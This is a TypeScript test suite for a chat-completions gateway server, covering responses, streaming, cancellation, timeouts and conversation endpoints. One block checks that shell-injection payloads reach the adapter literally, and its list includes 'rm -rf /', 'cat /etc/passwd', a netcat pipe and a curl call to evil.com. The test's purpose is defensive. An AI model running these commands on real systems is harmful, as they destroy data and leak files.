import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { createGatewayServer } from "./server.js";
import { FakeHarnessAdapter } from "./harness/fake-harness.js";
import { CommandCodeAdapter } from "./harness/command-code.js";
import { AdapterRegistry } from "./core/adapter-registry.js";
import { RunService } from "./core/run-service.js";
import { RunStore } from "./core/store.js";
import { ChatStore } from "./core/chat-store.js";
import { ChatService } from "./core/chat-service.js";
import type { HarnessAdapter, HarnessRunRequest } from "./harness/types.js";
import type { Server } from "node:http";

async function requestPost(
  port: number,
  path: string,
  body: unknown,
): Promise<{ status: number; body: unknown }> {
  const res = await fetch(`http://127.0.0.1:${port}${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  const json = await res.json();
  return { status: res.status, body: json };
}

function buildServer(
  adapters: HarnessAdapter[],
  options: { port?: number; defaultTimeoutMs?: number } = {},
) {
  const registry = new AdapterRegistry();
  for (const adapter of adapters) registry.register(adapter);
  const store = new RunStore(":memory:");
  const runService = new RunService({
    adapterRegistry: registry,
    store,
    defaultTimeoutMs: options.defaultTimeoutMs ?? 30_000,
  });
  return createGatewayServer({ runService, adapterRegistry: registry, port: options.port ?? 0 });
}

describe("POST /v1/chat/completions", () => {
  let server: { server: Server; start: () => Promise<void>; stop: () => Promise<void>; port: number };

  beforeAll(async () => {
    server = buildServer([new FakeHarnessAdapter()]);
    await server.start();
  });

  afterAll(async () => {
    await server.stop();
  });

  it("returns a deterministic OpenAI response through the full pipeline", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await requestPost(port, "/v1/chat/completions", {
      model: "fake-harness/fake-model",
      messages: [{ role: "user", content: "Hello" }],
      stream: false,
    });

    expect(res.status).toBe(200);
    const body = res.body as Record<string, unknown>;
    expect(body.object).toBe("chat.completion");
    expect(body.id).toMatch(/^chatcmpl-/);
    expect(body.model).toBe("fake-harness/fake-model");

    const choices = body.choices as Array<Record<string, unknown>>;
    expect(choices).toHaveLength(1);
    expect(choices[0].finish_reason).toBe("stop");
    expect((choices[0].message as { content: string }).content).toBe("Hello from fake harness.");

    const usage = body.usage as Record<string, number>;
    expect(usage.prompt_tokens).toBe(10);
    expect(usage.completion_tokens).toBe(5);
    expect(usage.total_tokens).toBe(15);
  });

  it("rejects invalid JSON body", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await fetch(`http://127.0.0.1:${port}/v1/chat/completions`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "not json",
    });
    expect(res.status).toBe(400);
  });

  it("rejects missing model", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await requestPost(port, "/v1/chat/completions", {
      messages: [{ role: "user", content: "hi" }],
    });
    expect(res.status).toBe(400);
  });

  it("returns 404 for unknown routes", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await fetch(`http://127.0.0.1:${port}/unknown`);
    expect(res.status).toBe(404);
  });

  it("returns 405 for GET on completions", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await fetch(`http://127.0.0.1:${port}/v1/chat/completions`);
    expect(res.status).toBe(405);
  });
});

describe("Shell injection safety", () => {
  let server: { server: Server; start: () => Promise<void>; stop: () => Promise<void>; port: number };
  const collectedMessages: string[] = [];

  const spyAdapter: HarnessAdapter = {
    id: "spy",
    health: async () => ({ ok: true }),
    listModels: async () => [],
    async *run(request: HarnessRunRequest) {
      for (const msg of request.messages) {
        collectedMessages.push(msg.content);
      }
      yield { type: "completed", text: "safe", sessionId: "s1" };
    },
    async cancel() {},
  };

  beforeAll(async () => {
    server = buildServer([spyAdapter]);
    await server.start();
  });

  afterAll(async () => {
    await server.stop();
  });

  const maliciousPayloads = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "&& cat /etc/passwd",
    "| nc evil.com 1234",
    "line1\nline2\nline3",
    "${IFS}malicious",
    "'; DROP TABLE users; --",
    "$(curl http://evil.com)",
    "a\x00b",
  ];

  for (const payload of maliciousPayloads) {
    it(`passes "${payload.slice(0, 40)}..." literally without shell execution`, async () => {
      collectedMessages.length = 0;
      const port = (server.server.address() as { port: number }).port;
      const res = await requestPost(port, "/v1/chat/completions", {
        model: "spy/test",
        messages: [{ role: "user", content: payload }],
        stream: false,
      });

      expect(res.status).toBe(200);
      expect(collectedMessages).toContain(payload);
    });
  }
});

describe("Timeout handling", () => {
  it("kills the hanging harness and returns a timeout error", async () => {
    const harnessPath = new URL("../testing/fixtures/fake-harness/fake-harness.mjs", import.meta.url).pathname;
    const adapter = new FakeHarnessAdapter({ harnessPath, extraArgs: ["--hang"] });
    const server = buildServer([adapter], { defaultTimeoutMs: 500 });
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await requestPost(port, "/v1/chat/completions", {
      model: "fake-harness/fake-model",
      messages: [{ role: "user", content: "hello" }],
      stream: false,
    });

    expect(res.status).toBe(502);
    const body = res.body as Record<string, unknown>;
    expect((body.error as { message: string }).message).toContain("timed out");

    await server.stop();
  });
});

describe("Malformed harness output", () => {
  it("returns a controlled error when the harness emits invalid JSON", async () => {
    const harnessPath = new URL("../testing/fixtures/fake-harness/fake-harness.mjs", import.meta.url).pathname;
    const adapter = new FakeHarnessAdapter({ harnessPath, extraArgs: ["--malformed"] });
    const server = buildServer([adapter]);
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await requestPost(port, "/v1/chat/completions", {
      model: "fake-harness/fake-model",
      messages: [{ role: "user", content: "test" }],
      stream: false,
    });

    expect(res.status).toBe(502);
    const body = res.body as Record<string, unknown>;
    expect((body.error as { message: string }).message).toContain("Failed to parse JSONL");

    await server.stop();
  });
});

describe("Model and harness rejection", () => {
  it("rejects a single-segment model id with 400", async () => {
    const server = buildServer([new FakeHarnessAdapter()]);
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await requestPost(port, "/v1/chat/completions", {
      model: "fake-model",
      messages: [{ role: "user", content: "hi" }],
      stream: false,
    });

    expect(res.status).toBe(400);

    await server.stop();
  });

  it("rejects an unknown harness with 400", async () => {
    const server = buildServer([new FakeHarnessAdapter()]);
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await requestPost(port, "/v1/chat/completions", {
      model: "unknown/model",
      messages: [{ role: "user", content: "hi" }],
      stream: false,
    });

    expect(res.status).toBe(400);

    await server.stop();
  });
});

describe("Command-Code smoke test (opt-in)", () => {
  it.skipIf(!process.env.RUN_REAL_HARNESS)(
    "runs the real cmd CLI with a tiny prompt",
    async () => {
      const adapter = new CommandCodeAdapter();
      const server = buildServer([adapter], { defaultTimeoutMs: 30000 });
      await server.start();
      const port = (server.server.address() as { port: number }).port;

      const res = await requestPost(port, "/v1/chat/completions", {
        model: "command-code/deepseek/deepseek-v4-flash",
        messages: [{ role: "user", content: "Reply with exactly: VERIFIED" }],
        stream: false,
      });

      expect(res.status).toBe(200);
      const body = res.body as Record<string, unknown>;
      const content = (body.choices as Array<{ message: { content: string } }>)[0].message.content;
      expect(content).toContain("VERIFIED");

      await server.stop();
    },
    60000,
  );
});

async function fetchSSE(port: number, path: string, body: unknown): Promise<{ status: number; text: string }> {
  const res = await fetch(`http://127.0.0.1:${port}${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  return { status: res.status, text: await res.text() };
}

describe("Phase 05: streaming + chat", () => {
  it("stream:true returns text/event-stream with OpenAI chunks and [DONE]", async () => {
    const server = buildServer([new FakeHarnessAdapter()]);
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await fetchSSE(port, "/v1/chat/completions", {
      model: "fake-harness/fake-model",
      messages: [{ role: "user", content: "Hello" }],
      stream: true,
    });

    expect(res.status).toBe(200);
    expect(res.text).toContain("data: ");
    expect(res.text).toContain("data: [DONE]");
    expect(res.text).toContain('"object":"chat.completion.chunk"');
    expect(res.text).toContain('"delta":{"role":"assistant"}');
    expect(res.text).toContain('"delta":{"content":"Hello from fake harness."}');
    expect(res.text).toContain('"finish_reason":"stop"');
    expect(res.text).toContain('"prompt_tokens":10');
    expect(res.text).toContain('"completion_tokens":5');
    expect(res.text).toContain('"total_tokens":15');

    await server.stop();
  });

  it("cancel endpoint cancels a hanging streaming run", async () => {
    const harnessPath = new URL("../testing/fixtures/fake-harness/fake-harness.mjs", import.meta.url).pathname;
    const adapter = new FakeHarnessAdapter({ harnessPath, extraArgs: ["--hang"] });
    const server = buildServer([adapter], { defaultTimeoutMs: 30000 });
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const controller = new AbortController();
    const resPromise = fetch(`http://127.0.0.1:${port}/v1/chat/completions`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        model: "fake-harness/fake-model",
        messages: [{ role: "user", content: "hi" }],
        stream: true,
      }),
      signal: controller.signal,
    });

    const res = await resPromise;
    expect(res.status).toBe(200);

    const reader = res.body!.getReader();
    const decoder = new TextDecoder();
    let buffer = "";
    let runId: string | undefined;

    const first = await reader.read();
    buffer += decoder.decode(first.value, { stream: true });

    const startedChunk = buffer
      .split("\n\n")
      .map((f) => f.replace(/^data:\s*/, "").trim())
      .find((f) => f && f !== "[DONE]");
    if (startedChunk) {
      const chunk = JSON.parse(startedChunk) as { id?: string };
      if (chunk.id?.startsWith("chatcmpl-")) runId = chunk.id.slice("chatcmpl-".length);
    }

    expect(runId).toBeTruthy();
    const cancelRes = await fetch(`http://127.0.0.1:${port}/v1/runs/${runId}/cancel`, { method: "POST" });
    expect(cancelRes.status).toBe(200);

    await reader.cancel();
    controller.abort();

    await new Promise((r) => setTimeout(r, 100));
    await server.stop();
  });

  it("client disconnect during streaming cancels the run", async () => {
    const harnessPath = new URL("../testing/fixtures/fake-harness/fake-harness.mjs", import.meta.url).pathname;
    const adapter = new FakeHarnessAdapter({ harnessPath, extraArgs: ["--hang"] });
    const server = buildServer([adapter], { defaultTimeoutMs: 30000 });
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const controller = new AbortController();
    const res = await fetch(`http://127.0.0.1:${port}/v1/chat/completions`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        model: "fake-harness/fake-model",
        messages: [{ role: "user", content: "hi" }],
        stream: true,
      }),
      signal: controller.signal,
    });
    expect(res.status).toBe(200);

    const reader = res.body!.getReader();
    await reader.read();
    controller.abort();
    await new Promise((r) => setTimeout(r, 300));
    await server.stop();
  });

  it("conversations CRUD + message persistence through HTTP endpoints", async () => {
    const registry = new AdapterRegistry();
    registry.register(new FakeHarnessAdapter());
    const runStore = new RunStore(":memory:");
    const runService = new RunService({ adapterRegistry: registry, store: runStore });
    const chatStore = new ChatStore(":memory:");
    const chatService = new ChatService({ runService, chatStore });
    const server = createGatewayServer({ runService, chatService, adapterRegistry: registry, port: 0 });
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const createRes = await fetch(`http://127.0.0.1:${port}/v1/conversations`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ title: "My chat" }),
    });
    expect(createRes.status).toBe(201);
    const conversation = (await createRes.json()) as { id: string; title: string };
    expect(conversation.title).toBe("My chat");

    const listRes = await fetch(`http://127.0.0.1:${port}/v1/conversations`);
    expect(listRes.status).toBe(200);
    expect(await listRes.json()).toHaveLength(1);

    const sendRes = await fetch(`http://127.0.0.1:${port}/v1/conversations/${conversation.id}/messages`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ content: "hello", model: "fake-harness/fake-model" }),
    });
    expect(sendRes.status).toBe(200);
    const sseText = await sendRes.text();
    expect(sseText).toContain("data: [DONE]");

    const messagesRes = await fetch(`http://127.0.0.1:${port}/v1/conversations/${conversation.id}/messages`);
    expect(messagesRes.status).toBe(200);
    const messages = (await messagesRes.json()) as Array<{ role: string; content: string; run_id: string | null }>;
    expect(messages).toHaveLength(2);
    expect(messages[0].role).toBe("user");
    expect(messages[1].role).toBe("assistant");
    expect(messages[1].run_id).toBeTruthy();

    const patchRes = await fetch(`http://127.0.0.1:${port}/v1/conversations/${conversation.id}`, {
      method: "PATCH",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ title: "Renamed" }),
    });
    expect(patchRes.status).toBe(200);
    expect(((await patchRes.json()) as { title: string }).title).toBe("Renamed");

    await server.stop();
  });

  it("UI route serves HTML containing expected markers", async () => {
    const server = buildServer([new FakeHarnessAdapter()]);
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await fetch(`http://127.0.0.1:${port}/`);
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toContain("text/html");
    const text = await res.text();
    expect(text).toContain("Gateway Chat");
    expect(text).toContain("new-conversation");
    expect(text).toContain("message-input");

    await server.stop();
  });

  it("/v1/models returns fake-harness/fake-model", async () => {
    const server = buildServer([new FakeHarnessAdapter()]);
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await fetch(`http://127.0.0.1:${port}/v1/models`);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { object: string; data: Array<{ id: string }> };
    expect(body.object).toBe("list");
    expect(body.data).toContainEqual(expect.objectContaining({ id: "fake-harness/fake-model" }));

    await server.stop();
  });

  it("returns 501 for conversation routes when chatService is absent", async () => {
    const server = buildServer([new FakeHarnessAdapter()]);
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await fetch(`http://127.0.0.1:${port}/v1/conversations`);
    expect(res.status).toBe(501);

    await server.stop();
  });
});

describe("host option", () => {
  it("binds to the specified host address", async () => {
    const registry = new AdapterRegistry();
    registry.register(new FakeHarnessAdapter());
    const store = new RunStore(":memory:");
    const runService = new RunService({ adapterRegistry: registry, store });
    const server = createGatewayServer({ runService, adapterRegistry: registry, host: "127.0.0.1", port: 0 });
    await server.start();
    const addr = server.server.address() as { address: string; port: number };
    expect(addr.address).toBe("127.0.0.1");
    await server.stop();
  });
});
